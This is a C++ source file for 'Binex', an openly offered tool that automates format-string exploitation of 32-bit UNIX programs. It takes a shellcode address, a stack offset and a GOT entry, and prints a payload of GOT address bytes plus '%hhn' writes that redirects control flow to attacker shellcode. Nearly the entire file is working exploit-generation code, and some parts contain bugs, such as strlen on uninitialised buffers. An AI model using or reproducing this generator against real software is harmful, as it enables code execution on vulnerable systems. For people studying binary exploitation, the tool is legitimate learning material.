/*
 *      Binary Exploitation helper for  UNIX 32-bit  
 *
 *      Copyright (C) 2012 Mohamed Ghannam a.k.a Simo36, <syskill0[at]gmail[dot]com>
 *
 *
 *      This program is free software; you can redistribute it and/or modify
 *      it under the terms of the GNU General Public License as published by
 *      the Free Software Foundation; either version 2 of the License, or
 *      (at your option) any later version.
 *
 *      This program is distributed in the hope that it will be useful,
 *      but WITHOUT ANY WARRANTY; without even the implied warranty of
 *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *      GNU General Public License for more details.
 *
 *      You should have received a copy of the GNU General Public License
 *      along with this program; if not, write to the Free Software
 *      Foundation, Inc., 59 Temple Place, Suite 330, Boston,
 *      02111-1307  USA
 */

#include <iostream>
#include <fstream>

#include <cstdio>
#include <cstdlib>
#include <cstdarg>
#include <getopt.h>
#include <errno.h>
#include <cstring>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <limits.h>

#define MAX_FMT_LEN  0x1000
#define DBG                0x0

/* parsing byte by byte */

#define _SET_BYTES(R1,N1,VAL) \
  R1 = (N1 >> VAL ) & 0xff;

#define _SET_OFFSET_RESULT(R1,FAKE_BYTE,BYTE) \
  while((R1 = FAKE_BYTE - BYTE) < 0)                                        \
    FAKE_BYTE+=0x100; /*don't touch this value , you'll be lost */

typedef unsigned int addr_t;

typedef struct
{
  addr_t gb1[4];
}got_t;

typedef struct
{
  u_int32_t be_off;        /* offset entry */
  u_int32_t be_addr;        /* calculated address  */
  u_int32_t be_got;        /* GOT entry */
  u_int16_t be_nwr;        /* %n primitive */
  u_int8_t *be_scode;        /* shellcode entry */
}binex_t;


/* hold each 8-bit from 32-bit address */
namespace BYTES
{
  u_int16_t B1;
  u_int16_t B2;
  u_int16_t B3;
  u_int16_t B4;
};

/* Assign each byte of BYTES namespace into FAKE_B bytes*/
namespace FAKE_B
{
  u_int16_t FB1;
  u_int16_t FB2;
  u_int16_t FB3;
  u_int16_t FB4;
};

namespace OFF_WR
{
  int16_t OW_1;
  int16_t OW_2;
  int16_t OW_3;
  int16_t OW_4;
  
}
//namespace
using namespace std;
using namespace BYTES;
using namespace FAKE_B;

/* main options */
struct option long_opt[]=   {
    {"addr",1,NULL,'a'},
    {"calc",1,NULL,'c'},
    {"offset",1,NULL,'o'},
    {"got",1,NULL,'g'},
    {"shell",1,NULL,'s'},
    {"nwrite",1,NULL,'n'},
    {"debug",0,NULL,'d'},
    {"version",0,NULL,'v'},
    {0,0,0,0}
};

class fsm
{
private :
  u_int32_t fsm_addr;
  u_int16_t *fsm_nw_prime;
  u_int32_t *fsm_got_addr;
  u_int32_t fsm_offset;
  unsigned char *fsm_scode;
  got_t gt[4];
  
public:
  
  bool show_py;
  void set_addr(u_int32_t);
  void set_got_addr(u_int32_t);
  u_int32_t get_offset(void);
  bool addr_isset(void);
  bool got_isset(void);
  bool nw_p_isset(void);
  void set_offset(u_int32_t);
  void set_nw_prime(u_int8_t);
  
  void show(void);
  void show_py_format(void);
  void dump_raw(void);
  void fsm_debug(void);
  fsm();
  //~fsm();

}; 

fsm::fsm()
{
  this->fsm_offset = 0;
  this->fsm_addr=0;

  this->fsm_got_addr = new u_int32_t[4];
  this->fsm_nw_prime = new u_int16_t[4];

  this->fsm_scode = new u_int8_t[512];
  memset(this->fsm_scode,'A',strlen((const char*)this->fsm_scode));
  show_py = false;
  /*
  if(got_isset(got))
    {
      this->fsm_offset+=16;
      set_got_addr(got);
      
    }
  */
  //this->set_addr(addr);
  //this->set_nw_prime(nw_prime);
  //this->fsm_debug();
}

void fsm::set_addr(u_int32_t addr)
{
  this->fsm_addr=addr;
  /*
  //n1 n2 n3 n4
  n1 = ((ret >> 24 ) & 0xff);
  n2 = ((ret >> 16 ) & 0xff);
  n3 = ((ret >> 8  ) & 0xff);
  n4 = ((ret >> 0 )  & 0xff);
  */
  _SET_BYTES(BYTES::B1,fsm::fsm_addr,24);
  _SET_BYTES(BYTES::B2,fsm::fsm_addr,16);
  _SET_BYTES(BYTES::B3,fsm::fsm_addr,8);
  _SET_BYTES(BYTES::B4,fsm::fsm_addr,0);

  /* holding result BYTES into fake chunks */
  FAKE_B::FB1=BYTES::B1;
  FAKE_B::FB2=BYTES::B2;
  FAKE_B::FB3=BYTES::B3;
  FAKE_B::FB4=BYTES::B4;
  
  /*start calculation we'll be care here */
  _SET_OFFSET_RESULT(OFF_WR::OW_1,FAKE_B::FB4,this->fsm_offset);
  _SET_OFFSET_RESULT(OFF_WR::OW_2,FAKE_B::FB3,BYTES::B4);
  _SET_OFFSET_RESULT(OFF_WR::OW_3,FAKE_B::FB2,BYTES::B3);
  _SET_OFFSET_RESULT(OFF_WR::OW_4,FAKE_B::FB1,BYTES::B2);

}

void fsm::set_offset(u_int32_t size)
{
  this->fsm_offset=size;
  //cout << this->fsm_offset;
}

u_int32_t fsm::get_offset(void)
{
  return this->fsm_offset;
}

bool fsm::addr_isset(void)
{
  return this->fsm_addr!=0;
}

void fsm::show(void)
{
  if(!show_py) 
    cout << "|> GOT OFFSET   : \"" ;  
  for(int i=0;i<4;++i)
    {
      for(int j=0, sl=0;j<4;j++,sl+=8)
        {
          _SET_BYTES(gt[i].gb1[j],this->fsm_got_addr[i],sl);
          //cout << hex << "\\x"<<gt[i].gb1[j];
          fprintf(stdout,"\\x%.02x",gt[i].gb1[j]);
        }
    }
  cout << "\""<<endl;
  if(!show_py)
    cout << "|> FORMAT WRITE : \"" ; 

  cout << dec ;
  cout << "%" << OFF_WR::OW_1 << "x"<< "%" << this->fsm_nw_prime[0] << "$hhn";
  cout << "%" << OFF_WR::OW_2 << "x"<< "%" << this->fsm_nw_prime[1] << "$hhn";
  cout << "%" << OFF_WR::OW_3 << "x"<< "%" << this->fsm_nw_prime[2] << "$hhn";
  cout << "%" << OFF_WR::OW_4 << "x"<< "%" << this->fsm_nw_prime[3] << "$hhn";
  cout << "\""<<endl;

}

bool fsm::got_isset()
{
  return this->fsm_got_addr[0] !=0;
}

/* fill got enry : GOT+0...GOT+4 */
void fsm::set_got_addr(u_int32_t got_entry)
{
  for(int i=0;i<4;i++)
    fsm::fsm_got_addr[i]=got_entry+i;
}

/*set a correct offset for  %n primitive */
void fsm::set_nw_prime(u_int8_t nprime)
{
  for(int i=0;i<4;i++)
    this->fsm_nw_prime[i] = nprime+i;
  
}

void fsm::fsm_debug(void)
{
  
#if 0
  cout << "debug > using address : 0x" <<hex << this->fsm_addr << endl;
  cout << "debug > BYTE 1 : 0x" << hex << BYTES::B1 << endl;
  cout << "debug > BYTE 2 : 0x" << hex << BYTES::B2 << endl;
  cout << "debug > BYTE 3 : 0x" << hex << BYTES::B3 << endl;
  cout << "debug > BYTE 4 : 0x" << hex << BYTES::B4 << endl;
#endif

#if 0
  cout << endl;
  cout << "debug > using GOT address : 0x" << hex << this->fsm_got_addr[0] << endl;
  cout << "debug > GOT@plt 1 : 0x" << hex << this->fsm_got_addr[0] << endl;
  cout << "debug > GOT@plt 2 : 0x" << hex << this->fsm_got_addr[1] << endl;
  cout << "debug > GOT@plt 3 : 0x" << hex << this->fsm_got_addr[2] << endl;
  cout << "debug > GOT@plt 4 : 0x" << hex << this->fsm_got_addr[3] << endl;
#endif

#if 0
  cout << dec <<endl;
  cout << "debug > using %n primitive : "<<this->fsm_nw_prime[0]<<endl; 
  cout << "debug > using %n primitive : "<<this->fsm_nw_prime[1]<<endl;
  cout << "debug > using %n primitive : "<<this->fsm_nw_prime[2]<<endl;
  cout << "debug > using %n primitive : "<<this->fsm_nw_prime[3]<<endl;
#endif
  
#if 0
  cout << dec <<endl;
  cout << "debug > offset : "<< this->fsm_offset << endl;
  cout << "debug > "<<OFF_WR::OW_1 << endl;
  cout << "debug > "<<OFF_WR::OW_2 << endl;
  cout << "debug > "<<OFF_WR::OW_3 << endl;
  cout << "debug > "<<OFF_WR::OW_4 << endl;
#endif

}

void fsm::show_py_format(void)
{
  cout << "PYTHON FORMAT : " << endl;
  cout << "\"";
    for(int i=0;i<4;++i)
    {
      for(int j=0, sl=0;j<4;j++,sl+=8)
        {
          _SET_BYTES(gt[i].gb1[j],this->fsm_got_addr[i],sl);
          //cout << hex << "\\x"<<gt[i].gb1[j];
          fprintf(stdout,"\\x%.02x",gt[i].gb1[j]);
        }
    }
    cout << "\"" << "+" << "\"";

    for(int i(0);i<strlen((const char*)this->fsm_scode);i++)
    fprintf(stdout,"\\x%.02x",this->fsm_scode[i]);
  cout << "\"" <<endl;
} 

binex_t *binex_init(void);
void binex_destroy(binex_t*);
int binex_write_fmt(int , const char*,...);
int binex_parse_hex(const char*);
void binex_banner(char *arg,int exit_stat);

int main(int argc,char** argv)
{
  int opt,long_opt_index=0;
  binex_t *bes = binex_init();
  int sc_opt,opt_py_format=0;
  int len; /* shellcode lenght*/

  //fsm fs_t;  
  while( (opt=getopt_long(argc,argv,"a:g:n:o:hs:p",long_opt ,&long_opt_index)) != -1)
    {
      switch(opt)
        {
        case 'a':
          bes->be_addr=binex_parse_hex(optarg);
          break;
        case 'g':
          bes->be_got = binex_parse_hex(optarg);
          break;
        case 'n':
          bes->be_nwr = atoi(optarg);
          break;
        case 'o':
          bes->be_off = atoi(optarg);
          break;
        case 's':
          
          break;
        case 'h':
          binex_banner(argv[0],0);
        case 'p':
          opt_py_format |=1;
          break;
        default:
          binex_banner(argv[0],-1);
          break;
        }
    }
  
    
  fsm fs;
  
  fs.set_addr(bes->be_addr);
  if(!fs.addr_isset())
    {
      cout << "[-] Were is the shellcode address !" << endl;
      exit(1);
    }
  fs.show_py = opt_py_format;
  
  fs.set_offset(bes->be_off);
  fs.set_got_addr(bes->be_got);
  if(!fs.got_isset())
    cout << "Warnings : GOT entry not found !" << endl;
  else
    fs.set_offset(fs.get_offset()+16);
  
  fs.set_nw_prime(bes->be_nwr);
  if(!opt_py_format)
    fs.show();
  else
    fs.show_py_format();
  exit(0);
}

binex_t *binex_init(void)
{
  binex_t *btmp;
  btmp = new binex_t;
  if(!btmp)
    {
      binex_write_fmt(2,"binext_init(): error in memory space \n");
      return NULL;
    }
  btmp->be_off =0;
  btmp->be_addr=0;
  btmp->be_nwr=0;
  btmp->be_scode = new u_int8_t[512];
  memset(btmp->be_scode,'\x90',sizeof(btmp->be_scode));
  if(!btmp->be_scode)
    {
      binex_write_fmt(2,"binex_init(): error in memory space \n");
      return NULL;
    }
  return btmp;
}
/*use int for write format an so on .. */
int binex_write_fmt(int fd , const char* fmt,...)
{
  char *data;
  data = new char[MAX_FMT_LEN+1];
  int len;
  va_list ap;
  va_start(ap,fmt);
  len = vsnprintf(data,MAX_FMT_LEN,fmt,ap);
  va_end(ap);
  write(fd,data,len);
}

int binex_parse_hex(const char* arg)
{
  int m;
  m = strtol(arg,NULL,16);
  if(( m == LONG_MAX) || (m == LONG_MIN) || (m == '\0'))
    {
      binex_write_fmt(2,"parse_hex():%s \n",gai_strerror(errno));
      return -1;
    }
  return m;
}

void binex_banner(char *arg,int exit_stat)
{
  cout << "Binex : Binary Exploit automation for UNIX environements" << endl;
  cout << "written By : Simo Ghannam a.k.a Simo36 " << endl;
  cout << "usage :" << endl;
  cout << endl<<arg;
  cout << " [-a shellcode address] [-o offset] [-g GOT entry]" << endl;
  cout << "\t\t[-n \%n format] [-s bianry shellcode] " << endl;
  exit(exit_stat);
}
